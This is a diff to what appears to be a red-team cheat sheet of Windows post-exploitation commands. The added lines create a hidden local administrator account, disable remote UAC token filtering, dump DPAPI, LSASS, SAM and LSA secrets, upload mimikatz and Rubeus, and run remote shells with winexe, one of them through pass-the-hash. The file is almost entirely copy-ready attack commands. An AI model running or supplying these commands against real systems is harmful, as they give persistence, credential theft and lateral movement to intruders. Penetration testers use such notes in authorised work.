@@ -1210,16 +1210,21 @@ impacket-smbclient $DOM/'$USERNAME:$PASSWORD'@$TARGET
 impacket-wmiexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
 impacket-atexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
 
-# dbf: Account Created
-## Automated Dump: DPAPI, LSASS, SAM + Secrets
-(t=$TARGET; echo '\033[33m--------------[ DPAPI ]--------------\033[0m';nxc smb $t -u dbf -p '123qweasdF!' --dpapi --local-auth; echo '\033[33m--------------[ LSASS ]--------------\033[0m';nxc smb $t -u dbf -p '123qweasdF!' -M lsassy --local-auth; echo '\033[33m--------------[ SAM + SECRETS ]--------------\033[0m'; impacket-secretsdump 'dbf:123qweasdF!'@$t) | tee dump_$t
+# dbf or Administrator: Account Steps
+## Create Account
+powershell -c "Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }"
+
+## Dump: DPAPI, LSASS, SAM + Secrets
+(t=$TARGET; u=$USERNAME; p=$PASSWORD; echo '\033[33m--------------[ DPAPI ]--------------\033[0m';nxc smb $t -u $u -p $p --dpapi --local-auth; echo '\033[33m--------------[ LSASS ]--------------\033[0m';nxc smb $t -u $u -p $p -M lsassy --local-auth; echo '\033[33m--------------[ SAM + SECRETS ]--------------\033[0m'; impacket-secretsdump $u:$p@$t) | tee dump_$t
 
 ## Upload Binaries
 nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
 nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
 
-## Winrm: Command Execution
+## Command Execution: Winrm / Winexe
 evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
+winexe -U 'dbf%123qweasdF!' //$TARGET 'cmd.exe /c powershell'
+winexe --pw-nt-hash -U 'Administrator%5917507bdf2ef2c2b0a869a1cba40726' //$TARGET 'cmd.exe /c powershell'
 
 ## DPAPI: SIDs, CREDENTIALS + MASTERKEYS
 mkdir dpapi
